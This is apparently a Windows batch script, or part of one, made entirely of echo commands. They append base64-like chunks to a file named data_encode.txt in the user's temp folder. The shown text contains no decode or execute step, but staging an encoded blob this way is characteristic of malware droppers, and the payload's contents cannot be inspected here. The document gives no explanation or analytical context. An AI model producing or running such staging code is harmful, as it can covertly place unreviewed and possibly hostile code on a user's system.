echo Oq2lr9RrxbFD70mCNI+JpIZc1oNmtuo9qCBDmiQ/Jk6sTZF3sMeLbE+3BRe2BWt6 >>%temp%\data_encode.txt 
echo 5rsich5r21dO6gRyfcON31v7g15pjrzRbpIuIZ60/EzzL6aLs/IvxZ+p+Zfhjy2f >>%temp%\data_encode.txt 
echo c/3aIArVKM46eNDUL4bCZZN1PH2GuegxGCZ3yXNasfcEy3zvCNDz38SP89Ta6eXk >>%temp%\data_encode.txt 
echo xiZNTCZ7ImPuR3In7zz1aB90SYS1I6z9O8DuqrEXu7j7tMVMv1qaZVceyrIH4G9+ >>%temp%\data_encode.txt 
echo b5mvnO15QU9xvOdV7qcaPuQ0EhEEWOnu0H1bMR0rO3RJcpKuxBHCcgxn052sXPI9 >>%temp%\data_encode.txt 
echo PEfa5XsErquA74fwLgPGxiWZw5JwdyZOItyJSTCWJSEnAx6+y7ITUMiZnHw3D7NA >>%temp%\data_encode.txt 
echo tyC3gaL/8CyUJhEcgQK+y4BQXroDw7+d2Eufh+BBt2CoEJP9Vh/NNsalZsLEGigZ >>%temp%\data_encode.txt 
echo oPlQ1Jo7diA7DXhpANLsGossw8iXopFrMJIU8MBu5tZdkTLKc97C9pP7s+RUO1Sm >>%temp%\data_encode.txt 
echo wZ8c7Yq2RmRo+f4QKIFQ146eQN0nZbbnyalVm5UkZR2v3CY4epRyK3F/Qup6FfdA >>%temp%\data_encode.txt 
echo w1DR/Q9LxE0XP/Dw/Tejvuw+tvhh8f6HoC1AxkTSBio/UUzQTinucEqXspZXbhWU >>%temp%\data_encode.txt 
echo Mqt0E6CZE1qi2fLbLAZOnJ1/t8XIiTPz1+BPer7XYuLEiRAIP0kQaMKl4vw2oF3e >>%temp%\data_encode.txt 
echo Y1CYAyYG7JeUHPMnrVRKRnLdAxuyHT3x+er54QSizEoqe4eCqBiIE+U9xggOE6kM >>%temp%\data_encode.txt 
echo bcGKkLuNXWasG+zUWzFkqB0NIWyNuAcod/N6rDE+lhPEx9ivXfyho8dm2Ku4+5UV >>%temp%\data_encode.txt 
echo IRywSkJ+S9XsTmenVB5BL+gITFEEg8FM0Sl3Z+rB5mgwDJemvbMPOg9KFwOeN3rZ >>%temp%\data_encode.txt 
echo Y1yh2R3ODilVbzKXshhTQG9xtPUwYbsBpCtKgMhANGEQxlI2AiE/AZd1WbKAX3W+ >>%temp%\data_encode.txt 
echo wrlaPF+hjLCTLplCST8DuSZTg62xO+rYHHXkRx2vpXE4IwJ9o8yfuarvGRj5icVp >>%temp%\data_encode.txt 
echo tDU+jmJoe7dtu3F+tzjR0dbUY/ttW8DqxjkcuJseEzB+ucG2vdCQGKJchzACxDlw >>%temp%\data_encode.txt 
echo LNYhTABhSgwxBSCIh3cW8rbGJ6IUFfKJgT9PYujMAGFODLFTh7AAhCUxxPM6RBJA >>%temp%\data_encode.txt 
echo JCWGqE9CkgRnoRBPkpAYuExHNwEgJiSGWKBDJANEcmIImw6RAhApiSG+xBmox+os >>%temp%\data_encode.txt 
echo tMaTZE0M3GZh6FIBIjUxxH/oEBMBYmJiiA06hA0gbIkh7mQk2Z2FdltjMyMJXNuX >>%temp%\data_encode.txt 
echo 2xNDX6XjmwRQkxJDJOsQkwFicmIIamYQUwBiSmKITpw2etKchWnx1ZSWGPjXOrp0 >>%temp%\data_encode.txt 
echo gEhPDLFOh5gKEFMTQ6zQIaYBxLTEEA5GUoazMCOepIzEwBYd3XSAmJ4YAg/SAsRF >>%temp%\data_encode.txt 
echo AHFRYogOHWIGQMxIDPEcigDPTGfhzHiSZiYGXqujmwUQsxJDlOoQFwPExYkhrtUh >>%temp%\data_encode.txt 
echo LgGISxJDpAKE6ZTpwPwzzjM2+a4zmmYaMn2kZb3d53YBrcechcfiaT2WGEuXieXz >>%temp%\data_encode.txt 
echo T4D4Z2KI3+kQnwPE54khZB3iOEAcTwxxjwmrjzoLaTxJNDHwIh1dH0D0JYaYrEN8 >>%temp%\data_encode.txt 
echo ARBfJIYIGRmEChBqYojdRiSp31nYH09Sf2LgLTq6LwHiy8QQm3SIrwDiq8QQlTrE >>%temp%\data_encode.txt 
echo CYA4kRjCyUgKOQtD8SSFEgNP1NGdBIiTiSH6DQzia4D4OjHE+zrEKYA4lRjiJVyq >>%temp%\data_encode.txt 
echo 9Qw4CwdiEmsAUgwkhv6Rju8bgPomMcRKHWIQIAYTQ1ynQwwBxFBiiDRGU9hZGI6v >>%temp%\data_encode.txt 
echo pnBi4OMMYPkwQAwnhnhPhzgNEKcTQ2zVIc4AxJnEEA2owXhGnIUj4jqdnJFEgNJd >>%temp%\data_encode.txt 
echo gOYsxJ5NGHsjxI5C7GjC2EyI1SBWSxhrdPSQ9lV9llQk5Kiz8Kj4Y52QownBDwCy >>%temp%\data_encode.txt 
echo Y+eSCtJr55MI0i/PLw0knCd7jjsLj8c3zzkEQzF7XXQ5Pbc0uFyHOI804HWI80iD >>%temp%\data_encode.txt 
echo z3ALw6M6C9V4ks4hGF4bZej6zy0NfqFDnEca/FCHOI80uI2RdMJZeCKepHMIhst0 >>%temp%\data_encode.txt 
echo dKFzSwNOhziPNDh8lkGcRxq8hesFnlPOwlPxJJ1DMPxMRzeAAiExxA90iPMIg1t1 >>%temp%\data_encode.txt 
echo iPMIg3mMpCFn4VBM/AyhcEgMfWaE4QufWxp8rEOcRxq8rkOcRxo8PYI0nXEWnonR >>%temp%\data_encode.txt 
echo dAalQ2Lo7zN8hSMAMZIYwq1DnEXRkBhitg4xiuIhMYRBh0DKQTzYGk+CNjAequ/w >>%temp%\data_encode.txt 
echo GST7M2fhZ/Gt+1lifH86w2rh6LnkB7S/DnHs3JrFD3SI82gWtzKSPncWfh5P0jnE >>%temp%\data_encode.txt 
echo ysU6uvMoGSOnLyRL/n76QrKk9TSS9IWz8It4ks4hVoiO7jxKxgOnLyRLik5fSJbM >>%temp%\data_encode.txt 
echo YSR95Sz8Kp6kc4iV8DBDdx4l42/DF5Ilrw5fSJb8fBhJ+tpZ+HU8SecQK/fr6M6j >>%temp%\data_encode.txt 
echo ZNw0fCFZcunwhWSJFkaSBp2Fg7FeOYiyJTH0vjDrL+eRJX/UIcIoTxJDBHSIYZQn >>%temp%\data_encode.txt 
echo iSEeZDSddhaejq+mc4iVGxm68ykZM3WIkXNpF7am00MM4pwahq3pIECsJp7R1U4Q >>%temp%\data_encode.txt 
echo J43d4Ot7nvXCI87CI7GaOwJIjiRG8Es9i8/OLTukoQvJjrKhC8mOBbjy7vmns/Cf >>%temp%\data_encode.txt 
echo 8TV3DjHC6+jOo5J8Nngh2dE2eCHZ8R+DSFKfs7AvnqRziJEfDl5IJblt8EKy4+rB >>%temp%\data_encode.txt 
echo C8mOFEbSl87CL+NJOocYOfzNhVSSt765kOz4928uJDvWf4MknXQWnowx00mUJYmh >>%temp%\data_encode.txt 
echo b/nmQjrJ3G8uJDws31xIeBwbQJq+cRZ+E19N55Ajrw9cSCd5Woc4zwRl7cCF9JBS >>%temp%\data_encode.txt 
echo RtKwE6RHI8e6dfe5VZKsgQupJEaA6BOxz6wQiGS1bU+2bU+4lCf5bNtvMdi2exKu >>%temp%\data_encode.txt 
echo Tko5EGuE2IQrk9JFEGuC2ASrkqS970mcAl0o+4/Om/2OaPbqsxfEFIhi6nuY2RgI >>%temp%\data_encode.txt 
echo tu0CcUMKrq9SQ+WnuqoyuPmvOS7u/+S5uFGXi/s3+F0B/gL4fRD8TUtdXMf1Lu4V >>%temp%\data_encode.txt 
echo p4v7aImL+/omF3cN+C8C/1LwV4H/N9e5uCducHF/utHFfVDo4gTwD+S6uIvBnwN+ >>%temp%\data_encode.txt 
echo abGLuwf8JN/F/a7AxX22yMUdhjzCkMck8EfsbciyLKBsaZZAPiIbsni0IMcTiA+0 >>%temp%\data_encode.txt 
echo GeCfPJxpe/xTqL2GYbzC1/YTgt835uDSvWHthFP/SZZm8eR0EILYZoZN/jMArLY9 >>%temp%\data_encode.txt 
echo 3LbatqaNM+2xTUqSu+zy8dD8PTqK2mWBF9hR08jP5tW2TUnwV2THTyZ+svHjwo8X >>%temp%\data_encode.txt 
echo P3fjZ03gXUzd0IffoXa8a1R6T50SzXftjbE8geRHZ54CpKcQqdyVKfdlQtja/qF2 >>%temp%\data_encode.txt 
echo tNYS7w1ssPXG4iP0D7XjtoA4sTmpSO4z6D7p66F2PH8pCgqUgZf7+KF2NIgSM6Ml >>%temp%\data_encode.txt 
echo +A1+lSSliJe7BLlP0OOlLyNIY/ZMaBxQTuqsxCKHR8VUspw37XFYc+jth7CnCWS5 >>%temp%\data_encode.txt 
echo lfmBK/qWQNCuf7WHmllGKgVfeadb4zRHlxsvdufo2yYDp5hIpZXcJATW2h1mtkft >>%temp%\data_encode.txt 
echo VaSQ4g7TRmRGyU6DuDroFtAA8cfWQRe/WrpTcR8jaF9FA+5jyk0jsjYqPkBKwoEi >>%temp%\data_encode.txt 
echo Y4AvIjMbAnwDKeYVd39Tj5hG/kbx/vc/GZpLtKa29WmbilVTS4lGzshnRqWexh7x >>%temp%\data_encode.txt 
echo GjUTKGJHbaYhqotrGB1vMPuaD+hVaEyjSWF6alQ3A3YPVFetQrMtoKohh+2M5sj5 >>%temp%\data_encode.txt 
echo c+9Em4Bra/CXNo8wW72mNnEGWYwhZLffwAxndHsiIoUYJgGPHu2lL+MKntuau94q >>%temp%\data_encode.txt 
echo TtYzB17upn/WgzFzZaWVrmVHlfox4d/IzQItM6Fdz2GemXeYFrYFaaPuTqJmMxTm >>%temp%\data_encode.txt 
echo y20GZq6AJgzJ9DcQR7+ED1on+IUaimYXez9j3Rvo3BgpSa283m6S1jSsT2NbvJPB >>%temp%\data_encode.txt 
echo wTZ5J4ADt3mlFaR4JlTrclLKN+0X56HRxu3amgx6CxczSlIXaJJVk/rpTVzUhEk9 >>%temp%\data_encode.txt 
echo Nmiwi9OJK4MIkNpODKVkjTBmYJXABoOUCNoKa2WHwLFCWDlx4fjt6EvZdvSMho06 >>%temp%\data_encode.txt 
echo qRngYKTawMF2pC3VVQ5mAWMELl9jx53oDuZMoxWFWHevomFrmz1I/4s50jBbzKJ+ >>%temp%\data_encode.txt 
echo E8+JxcQGlBYGSg0thgKo1eH575f5AhWGMmrMR2OwiqZBcbp2fZmPFheydiK75Z1W >>%temp%\data_encode.txt 
echo x6AidLp4g48ez4PCVK1SU7CNkxRDZwHPVVcGI92pfiNkgRZkbQgmX851eniuKmr1 >>%temp%\data_encode.txt 
echo AW1Shh3uTSyZ4g41aeLVg0l28WIC3ZT3lRIDWZNJdpP1GdEKrMIN8cEkQTS/idvw >>%temp%\data_encode.txt 
echo xB1i+9kDXr/Jb6jB+lIqB5S6ES39bm8BV72qB+pV759lUKt3ZKEgSQNRmrHidm9p >>%temp%\data_encode.txt 
echo aY13WWwPXT8mulMBCXufMieyq55NVgoAfZVjOlljlUdB3fVgxB1Zi+TTo6Lg/Nr2 >>%temp%\data_encode.txt 
echo OCYOLKoN3PUXO0lRiq3yj3kOdEHcYTbgIuNNAv03Y+TYD3peQPtHtOi872fsCQZ5 >>%temp%\data_encode.txt 
echo Zwbbz4ds+KEC3hI1ERcdBIV9seDopvv+hvZsNRnaGqu2xq5Bw17DTCytlQwGiqUY >>%temp%\data_encode.txt 
echo W1EWxplorvCVl5EvHG2OQ479jkGHpu1bhcNZLJ58QU6Sdr+BnjKgNSOA9QCgpn0+ >>%temp%\data_encode.txt 
echo Js+gyvzc7TXfQCWVaun3edle6ph960NZwu2lmpiVRp8b1anRmXgLNlX+rCtdnHjJ >>%temp%\data_encode.txt 
echo fSQ1gxmACqR+Jz4ZVSA8anYW8LVmf2rFh/MiZqrYMyfmd8NgJSZ56dM3AKsw04oJ >>%temp%\data_encode.txt 
echo kTNkc9EGR87P3ItmeSZHW7CsXEuvQSO9xRhGwvQVXPY+WCGf0cRpTYekCr+mR9E9 >>%temp%\data_encode.txt 
echo xog9KO84pBb6/HOhxLNcjLGRsyf7InC/j8JNdhwqi4T9goWpPDnsGPTR0VxkdMj4 >>%temp%\data_encode.txt 
echo IawIElwVrCkqcXH0Lai/rQhfIYc1JqBqsCReekcUZRLuoHHqP0FQbUFAgBMnepkJ >>%temp%\data_encode.txt 
echo s5zKClUBUb7yd0NoETqIZ21sHFdOS40RyyIxXTML/4CEnRlyV4Y8mvHooW0GVUe7 >>%temp%\data_encode.txt 
echo ELSUoI8sxngoUOaDnRnlgdaDgAlIXY91lMqSnsiQvzJIajWa07H+UPpmNtYdqBVo >>%temp%\data_encode.txt 
echo aXATrzxoXVHqXVlRWbEK6n6XthfbprSMCSN1DUkKzGwqBkTEsRmySZJHNalW9RG+ >>%temp%\data_encode.txt 
echo 6dj3CrgafDXEz3mZudav0DAr1DQoFemNJIfLpblEGvEn1Wy4D4Q+nbckWq5JaBnv >>%temp%\data_encode.txt 
echo i0uSJndrT5hgGHfWWSWCGhhISdL5hAmAkwBwMwJ2qjRihlgeyGu6A4lK2izv1pyd >>%temp%\data_encode.txt 
echo 4nyo7nmalIYjar4WMZUDn9WrpT+lmwxZSPcTNpV/4npdv2MDf81TQFjNk/hBl5+j >>%temp%\data_encode.txt 
echo v8FREUYvOxTWjvYuMRkOaaoqtTn1gI0lfQlTPYcfdAF73a2bP5OQxmwNrWNJVYuW >>%temp%\data_encode.txt 
echo /iSk0wWgr6YVU23DD7r8RjrnvEkb45LuwlQ78YMuv4l+MRpLak2YujkudS8mPIgf >>%temp%\data_encode.txt 
echo dPl5+ofRseKmQ+VBUoYmhsAa9W/Q0ewq9xERxOkyEKcbsqyknewzdTpHawVn2PaT >>%temp%\data_encode.txt 
echo p5BxQSX9yX4+qpKujemAtp/8FEL7jhrGaagvgCSzVlUHSZej82UbqnUTxxL0mmKw >>%temp%\data_encode.txt 
echo nE1+GVIO4Z4jyNln0d2pu//AMB43rk0FBa6PD9TySlJgEw9BprWTTtk2TgTVL1Ar >>%temp%\data_encode.txt 
echo rLb9zRbYJAx1JqGUvd/2xucmm/wqU4cfWT4QqB0gGriq7HIfKLiPeEDVfeTh7EBt >>%temp%\data_encode.txt 
echo tjyM/gOrbTfYPraCrnsJ+HrR12GN6MWPfIjefvQ+khnYlL329UCtte+PEdThQG04 >>%temp%\data_encode.txt 
echo cDN3QdzCONzCeNxCPG5B9SHikUDtyHegmR+Hlx+Pl4/Hy8vD9kennLI9AjVmD9Si >>%temp%\data_encode.txt 
echo xg81Zlep7Y0j/1q7RxLVLuED95W5OK1XbyhxSoulOelmudMgdxn0IFC/9zEeQev/ >>%temp%\data_encode.txt 
echo 9j7jqd/Jn5m0rKdZsqyACD+b8bMB/prh7xn4i/DIZkQW727xGJqLDJEQqOOxsBaP >>%temp%\data_encode.txt 
echo sbnIGIUNLJoYyLOxXEt19osw2FNclKVAkf4ICJn/fotHay7Slt8mf2GQTrEkF+Nw >>%temp%\data_encode.txt 
echo vg9IhXj5K14+wZ899bsRINl+B9CaCZ+58JcDf8vuiKPVY2ouMsXRxvzj6YoPG1eW >>%temp%\data_encode.txt 
echo oS7sCqLt5uW3YZl0r3RS71KP1jR8xSZbJ/ALzWWBv+V2+Pgy4VOVDZ/VLvg87IVP >>%temp%\data_encode.txt 
echo 7d3w2bgmMqO6DcA2lQPYpmoA2/R9ANv0CIBtWgdgmzatiU7g6nFyshnnarPlrzLl >>%temp%\data_encode.txt 
echo E5lx2UQQwbxtqL0X4f4x1D6CE690qBqoIGKBCRnOxjBQUkHLtMknDDAKYVFg+iad >>%temp%\data_encode.txt 
echo jJRSNaE+0in32vBOgqOoL+yTj2xq/yJJXB2ZwzH+tiC3I8/6kMGrsiNT0tuQQctx >>%temp%\data_encode.txt 
echo SlqN3L7ahdwPU1Io8mos8mosH/I3TlPX4TR105rAdiyfPlm9RdoKtFVD035hBl3/ >>%temp%\data_encode.txt 
echo Un2++K8FDdRCB8m8RfqnfOQSMZu0AyeINjJVmYazzk5eL1G3fMSkc7un6GZpKDoF >>%temp%\data_encode.txt 
echo vTnKD7HyvIF3B83fO//9UtKhp5rQMrV5GkvVTo0w/QTM0MugjxVLpyr6+kbHzzhB >>%temp%\data_encode.txt 
echo 6+NB+gpDHaw3uYjxBoO0sLFNvPyGewzSvMZj4qx2ar+hwCjNgsBJN9xjgsG1nZc7 >>%temp%\data_encode.txt 
echo +MZj0n6igRbF6n1Gm9xtCBJtiN0lJGa0GOUOA6A6LrcbIOHBIZxLcOJzqwlEYB67 >>%temp%\data_encode.txt 
echo IbQD83gP8tghtxvVRqSnHIYBQX04Vj7UZ8sj8/UpLQYdW35kyn4C4g1vaKOjG017 >>%temp%\data_encode.txt 
echo 5ZDm6ADKXuYMhgaRkoIRAJwNuC96GZ8fEie+jDdsiUb1w8BjmpoaeGxUFQKPnVVN >>%temp%\data_encode.txt 
echo gcdGUHuJ5DGrZRLmsV9c3TwNhYye0ReqmbUPy4sYIrmRSbH8jkCKRY2D4hVDHSy3 >>%temp%\data_encode.txt 
echo yfjLsutSpqF2XR1crTs6i4xczFMdbI787hpbn+EjpGRFi7s8Wlxz3EpKtIbOW/6F >>%temp%\data_encode.txt 
echo UP4svfxTxspfwGp1fnswUDAac52NuUYirth6UTmuEr2OmUHb+HQBVyZOakmCCoJM >>%temp%\data_encode.txt 
echo ciOS+ARJGkdLV4yWIqTlUqAlQ6fFymiR9kA/VlPlE0ZVkE+YVBP0d1AG0vSBWJpA >>%temp%\data_encode.txt 
echo PoauId2lXtYyFSQ+VHA+axLoIOK8CMw/dZgc8oHeXxCQAQE0kw1fNttWVcXVtH0V >>%temp%\data_encode.txt 
echo dB69qwGabr09LdH2hOQRmj8BBLuhPa8c357STiWGBZrQsR89zeXGiD8a5Rdq5r4B >>%temp%\data_encode.txt 
echo mv9v97MFAy2bhhfhvBVm/zC9pTePTf7pZN3gNH4632GFiY4dEqUsRstlgmeQ2LRS >>%temp%\data_encode.txt 
echo 7r3En1kxvxtQHujW13/Y4oSAeTkwr5P1+eI/2M0J+O6Yo82146F/4EkMxyGlcoRY >>%temp%\data_encode.txt 
echo CNrCX0XyMSXZA/JnyxqIdnaJkxzhA3vKysrGbMRr9h4u4NRkOWyQUmo+ATe9Nhuo >>%temp%\data_encode.txt 
echo iR6ksuRmSJNq1uPRsRo8OvbolThJqanHgA0YcA8LIB4eAFM7zUiVgXiETvh+a/GC >>%temp%\data_encode.txt 
echo nTeB0qayWSzPjnDRBWhLjQV3tDXUCTghtz3VVqnXhdyfIdfZOWkyRVNh4KwJaIX7 >>%temp%\data_encode.txt 
echo PiIMuK24aIZrXSWj7FBhf8Ct+Y2KO7QSZviKewCPBQTc1MtMtvEqEkQlGnuCiANF >>%temp%\data_encode.txt 
echo l54tfdEB1IQNeLYoG5vIVdNOhZcMkp1pr3GnuDDdcsybRTwDIbviDhYsih0suDL+ >>%temp%\data_encode.txt 
echo YMGssYMFk9nBAmvkYIFogikczP0YEaXIMAH3iLdmhM0mtHROxzrbV5N2P2Y9ok9H >>%temp%\data_encode.txt 
echo cM4jpo6fXuChTqyZEX2206OjBNbZim0OfGPAo8T0P/U5N3rZfCXiZcB40hiL93hk >>%temp%\data_encode.txt 
echo Xh5hRcYzjPtsTUuy9aM85WdhkhTBHE3LIm4Zl3bQLfBSOppJizPhC8NTQ50Vn3+s >>%temp%\data_encode.txt 
echo TcWFNvAAc21ad2rhWFvPDZRYy3z0bSNr6kuJlAZlvUYeNW4wy6NZG7NoE/SSLm4q >>%temp%\data_encode.txt 
echo LpHuhkZzHCIr7DD+mqGnKclVMMHuCZYDJYGSg3SXgS09OTSlbgB4RDWBpyXDpbit >>%temp%\data_encode.txt 
echo AfcnXtt26Eze5soRGojOmKXDtu3uDOCc+jNXS4LcDYwUVs31Z+ZLE0mdteWSIoBW >>%temp%\data_encode.txt 
echo 6qyAqM6qnwezS+tbgldl501YJ9jeCcpte9XZ4L8nb3rE/7I6BfwFMX8PiL1uDU8U >>%temp%\data_encode.txt 
echo w7Q1359cpea0JBU1u0OANm+9OCNvpTgNYkx+oUqTQlAXtAULAXnaWbC9KkaFYz9g >>%temp%\data_encode.txt 
echo GhpUVvSTFcDqocCte+uHGR0fyO3j6AD/ODrAj3T0aPKwJl7r3L12PnEPON2hR1Mk >>%temp%\data_encode.txt 
echo s7Okv5b3W9Vk2x87/YKpHfoQ5LgSskzZi0X/NbAYkKWsCFO8KIpUhgeDgpRM3BSE >>%temp%\data_encode.txt 
echo jtuqFpC6gfIyehYZBM+BzqV/dWCDXQbAg0GDZJb3aOpFg0GjmPQmcoJqfxN5QJ2A >>%temp%\data_encode.txt 
echo QcahT8mn9XXHuGpb4xx2idNB+TkviP6zfVPRiyxSVk6GSQmMq1YuUM2DCjaBGBQT >>%temp%\data_encode.txt 
echo KeDVdDm/7TC79WZL674CTjFteQt/buLVAh/97XW4mB9YJ5R5SfEyJYUUFysT6aEc >>%temp%\data_encode.txt 
echo XL6+nnK5UBQbToQbMLuql4xSKjY/80FWBtJVvQoXl/ReZShWDC0lQmOPmJYjiHZ6 >>%temp%\data_encode.txt 
echo cmGMJ28AUcZOteRy0hR6cCzi0gW46oLnwHQcJdZAgSEfz0Oss+Im0ut88Wy3vTLo >>%temp%\data_encode.txt 
echo iPYFUmL3QfGycUNqQaAwAptCLADqnQ1VfaW8kTdstJbCHPt2eiWgV9MdbWqaPuWm >>%temp%\data_encode.txt 
echo 32TjCePN+opfVQQn3j0IXT+5tJSA2MKTN4qB/oRdfZbWE9yyHjq0z2+qwtWnVjyM >>%temp%\data_encode.txt 
echo oVqcnXVJpHMrxvh5L+VzcMVm6wbw0hU5rNvI+ejjpPl+3qcsRkB6+PoxqGvHQ5mB >>%temp%\data_encode.txt 
echo aauC5Q7tHddeFHJs0SrgyfTSV5wctwWByEftpy3KolbSJfcuebA7h/BPZx6B4KVC >>%temp%\data_encode.txt 
echo Bq6BTcBtFjx2k9TlsePoJHfmFDWMUjwW/kc8X6UX9UG3kGN27dUllI++swTaoDEP >>%temp%\data_encode.txt 
echo BMYgy0RbZKF/WRLJsYLwFrkt06svfaFWPmqVDmqLWQEehsLIcxj1FVUxsaqDr/HG >>%temp%\data_encode.txt 
echo JGAsTGRhfmtNMY7T5H0g8P5jnK4XvIOLS1G94G3cuwkp0rGocjANO1RnAvVAOqZr >>%temp%\data_encode.txt 
echo CL/A5Hp2Df24nzF2S6Fcl4FqRBmpTFOanjsDU6cMemd2jPu2XoOnbLS+dDwyfgir >>%temp%\data_encode.txt 
echo T+z1gZycGQhsAGC6BU3LSoTA25uZ/ZZj/3/BP9JO3kZUcq9RaXoSHCkdCgNQnn0K >>%temp%\data_encode.txt 
echo v0//CvNJbn76Gfht0qSkziZ0GTQpM9DE4Bglgab6M3hNhJQRYH5g0FJvIPAC5rvE >>%temp%\data_encode.txt 
echo hGeiBriI9yI8zIEL+rdCfTl65F5DSrs4s+mQxIP0+wFpwgydQenKpsH185ynaueo >>%temp%\data_encode.txt 
echo FUQnrF28FYqV3jT4GN9sU1OjkOKtzdakQOAY4rZDVvVvN5/ByyVSCSu2vIUJl2rS >>%temp%\data_encode.txt 
echo WcXuh1hFn30XjytDhmZ5t6a+F8ux1T9a1bzsEk39s7yDx31DycI6SJA04DWu+2ik >>%temp%\data_encode.txt 
echo f+mbgcMN2J6bam30o2uwCaxsxVUtK3McMg3m/hYRSELDKKasFZyv4+86fptBXeCj >>%temp%\data_encode.txt 
echo K5bgoccRXIC8CHWBwM8Qmv7AyG6Q+ItBYdBeehA1zJbgquqqnphYcqcVy9QgXoKf >>%temp%\data_encode.txt 
echo qTKdIE6S69JSRVuL2573PVHIW6ufZtZHWx85WU7eYcjnaaz5eFOnajR1VUeYvAwh >>%temp%\data_encode.txt 
echo AstdhBUY4o1kmI6iGK4Uik1hZeMisof45jbt38RD1WcHbtFI0LFfWT53SLLWd2ST >>%temp%\data_encode.txt 
echo g/WnczdaIe9FhrZeM59k3Es8i5rt2vJFZPki9b35w8rGHM2zCDcHkMf14d+aMFd2 >>%temp%\data_encode.txt 
echo 0VKlFXOtGyF7MOs6Qc/bQrpSgmJ+Gaof9kChVlaueObS+49ALVaGV22ub88mYfL3 >>%temp%\data_encode.txt 
echo +mFGSlqUlG4kRYiQsp3UjcRR09Nh16nxOQZzJfvG+eWkDoUqdA/60zSmlli0JJKk >>%temp%\data_encode.txt 
echo WmSbBn0KZZLF45TsG/5eHZWzkaQzMSmkg45mpXZIKy+JwvbFYEsdbUrJiGJQCnil >>%temp%\data_encode.txt 
echo QFAKrEqBXSlIUwoylIKZSkGmUpClFMxdrRRkKwU5zQV5SoMLakZpWIrioz2i6EGt >>%temp%\data_encode.txt 
echo 0f/WzREIpzxezLaFrYoFd4I9PAGlxiMAfygeO3HPVDxp7IQaSAxkA20744LHYayS >>%temp%\data_encode.txt 
echo X2TMHZVzGHkd/cFCZl8hXw5y0ggoO+XLuKrYYNjQL44TRIyvLCSnnK4APbmZSQSY >>%temp%\data_encode.txt 
echo F1QEAthRQYhdh7ZpFr3DA61MJBAPiDddZniJx6plw9xBW8NjGEZ76TSU82Ny4rAB >>%temp%\data_encode.txt 
echo b4DBbk1C9HqIq3/7V9GO/eRYxy7XXsPs6brlbHZSMkI6qx0fVtHX38Rezua7esex >>%temp%\data_encode.txt 
echo lhGO1KPZEOFaMqASW3Bwn9yyr+X9Gw6IyS3FBlfLvsYeKeSC4JtZ5DTVFLiZqx++ >>%temp%\data_encode.txt 
echo X0ytH3aLAsIAxFctxRrZW1w/nC1Zcd2uWEO3OHTDB5KpmGgtyQGXoVkI3G4A2K9X >>%temp%\data_encode.txt 
echo RVgAdIlAQW/enesm295pl2mm3LuJWN+7CnR+Fa3rQV/luzGMf28uhFXGdifj6PeV >>%temp%\data_encode.txt 
echo k2xs/HdwUbIlw7b9g/q83PtxpallpcEF3kH+Fl46pYevlywtK41ym5H8lJV5QsuE >>%temp%\data_encode.txt 
echo ZsEVuC+LaxGAvpYDzSu1lo8b90shtnWnsylmMUzWgeIrJVNtHhu7QHW5OFAyAqxB >>%temp%\data_encode.txt 
echo iuw4rhWDbuGlwzfgLFfAo+UGUoSKtUA/hBRKkVXOuQyIco84i+yPJilFdpB6xoVt >>%temp%\data_encode.txt 
echo 8o0gUEGKGJWLWQ9E3kJJEPgpcjK92s663QzHodwqu60JH9qmdfNig1vnFWxwq1oV >>%temp%\data_encode.txt 
echo VKpylKqZfU04effYc6sybE+idZBWO9O23bOA7PZSvKdN8cyUw4L4lhxOWtelZTXN >>%temp%\data_encode.txt 
echo 8rs4spt+BUyluuXlczWlKqu5KlupylSqrmquylNzIBYvXlSvAMfdyeC4WKmaq14K >>%temp%\data_encode.txt 
echo vquAz1Q7OG5GRxI4PjEjsbZGPzuNYG/hmj0LwN/0IJpsAJ8/7sXrHN7Br9HWdAuD >>%temp%\data_encode.txt 
echo yuhbAr+/fsDFPQ9/r8NfG/z1wN9u+PsI/nrhb1yd/OYbTft2nTwwN1Ynf778u9cJ >>%temp%\data_encode.txt 
echo nu//dp0seJDVyTB3vjrZxEXqZNmE+DrJMEbqRI7WyWnL/9s6eQXaZjv8fQB/f4W/ >>%temp%\data_encode.txt 
echo f8DfZ/Cnwt8A/NneKVgAPUa8WqYm8TKZCuI0NgimgF+aKd+cKahT4curdvga1GT4 >>%temp%\data_encode.txt 
echo Zqo8fI2gidNctqIAivq1V8Rqbv2cqKJO74hG28eiK+aM0+NLfX4OZK8OKc5u8SzQ >>%temp%\data_encode.txt 
echo 26fZPQIzJVo5Ub8ZSPNkQK7LM7RthioU2XoqouM3VgUDngwvNoee2EuPpqItCoph >>%temp%\data_encode.txt 
echo bPIarh46ddUCmEJ6cVXFk8exNZQ/s7v3cEs0vyzCFv2p38oQq1twNS9fALIfZE4a >>%temp%\data_encode.txt 
echo XXp5rCyBLKaXQFVUrYr1uXNl5o5ltgipjWaYy879fCuP3jmxPOaNz6P+sQVXBkrn >>%temp%\data_encode.txt 
echo ikm309+BaA7KBWk8KUgjrhHF2NT2mElOhioKthQsyPNIFxGD3AvTcE4/m9VVMBM3 >>%temp%\data_encode.txt 
echo 3/p+DOyVt1y6nBj8wp2zO1j8VIhXSmfS749lvG02ayj5sas46Xie3/azP+F+X+Pz >>%temp%\data_encode.txt 
echo +KztzeJNectER94d4uy8GlvTQRSCBfb6nBrJ6oLh19Hm6sOD535jH/arroKrUB/v >>%temp%\data_encode.txt 
echo +5PuFtD9O0xSam8x5jmkjPofGRZKkwOFRojFi/gBRV8j5nOdlA5xiySbHpeix6kP >>%temp%\data_encode.txt 
echo 5t0npuU9INrzHhGteRKoZutFPm+lVAYwaL2g3gIOtvtfkPeQeEWeKF6Ut05MzfuR >>%temp%\data_encode.txt 
echo tAAi0NhDnQsOVCvVS8CB1aJOZSV4SBKwBH5eNfpNK5WCqy5Um9Wmc9fm9KxYbd57 >>%temp%\data_encode.txt 
echo 2f9fm3pt6t2+FLuK45B/ZYXtHc8COXzfpof0uwyc7ZuWiNfL4QJbIw7FcvgmcYkc >>%temp%\data_encode.txt 
echo Xrpxlhwusv20gQWVSTYQip8LTCg2PcdmB3378WZfg9+ulsv0TjFdpkmiD0WZdLQM >>%temp%\data_encode.txt 
echo gK8EOtV94KiFTqd2y+E1m0oQ8fc3QuYPiCC8HxYnyuFHpNcAZgVgVl8Ax0Eoi/ob >>%temp%\data_encode.txt 
echo eXmmvcyfDP51iIWAowWx/ASHLQDtq0Xtiq61Na4GBxOfe0F82prQW9b3AHxzqrJt >>%temp%\data_encode.txt 
echo TdfgUtQHq5XKkebKUcd+UpVZSIJKSbid8o0d4rUk2E4t4LB0ukeuVoXGv4sp4JpP >>%temp%\data_encode.txt 
echo 3gcQdRIJ7qMQOQGCMiFoRbjFt6D+9HrRXH96pZSKac0vGUT+L6gPHKo/fY84of50 >>%temp%\data_encode.txt 
